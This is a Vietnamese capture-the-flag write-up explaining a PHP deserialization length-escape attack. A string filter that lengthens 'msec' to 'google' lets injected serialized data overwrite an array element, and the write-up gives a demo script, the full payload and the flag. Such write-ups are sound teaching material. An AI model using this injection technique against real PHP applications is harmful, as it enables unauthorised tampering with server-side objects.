Yeeee!! Cứ đọc đến PHP là thấy phấn chấn  
# Giao diện và đề bài  
![Imgur](https://i.imgur.com/zHh0kSo.png)  

+ Phân tích đề bài:  
Hàm filter sẽ replace toàn bộ chữ msec thành chữ google  
Nhận tham số chúng ta truyền vào adc, sau đó tính độ dài payload và đưa vào trong đoạn string ở dạng serialize 1 array có 2 phần tử  
Sau đó filter đoạn string và unserialize nó ra array chứa 2 phần tử. Nếu phần tử thứ 2 thỏa mãn thì in ra flag.  
```php
function filter($string){
    $filter = '/x/i';
    return preg_replace($filter,'hi',$string);
}
$a=array("applex","orange");
echo serialize($a);
echo "\n";
$r=filter(serialize($a));
echo $r;
echo "\n";
//-----------------------------------------------------------------------
$b='a:2:{i:0;s:49:"applexxxxxxxxxxxxxxxxxxxxxx";i:1;s:8:"scanfsec";};i:1;s:6:"orange";}';
// Ở đây số lượng ký tự x = len('";i:1;s:8:"scanfsec";}')
// 49 là độ dài của 'applexxxxxxxxxxxxxxxxxxxxxx";i:1;s:8:"scanfsec";}', tạo ra 49 byte chứa đoạn string
// Sau khi thay đổi độ dài của applex, thì applehihi.. sẽ chứa đầy 49 byte, lúc nào sẽ xét đến i:1 là đoạn string mình đưa vào
var_dump(unserialize(filter($b)));
```  
Kết quả:  
![Imgur](https://i.imgur.com/JvcN32Z.png)  
Với cách làm trên, mình sử dụng payload: hehe=msecmsecmsecmsecmsecmsecmsecmsecmsecmsecmsecmsecmsecmsecmsecmsecmsec";i:1;s:19:"ms3c_m@i_d1nh_hehe_";}  
![Imgur](https://i.imgur.com/zxdhNPC.png)  

Flag: MSEC{_Welcome_Exploit_PHP_Deserialization_!!@@*&^$}
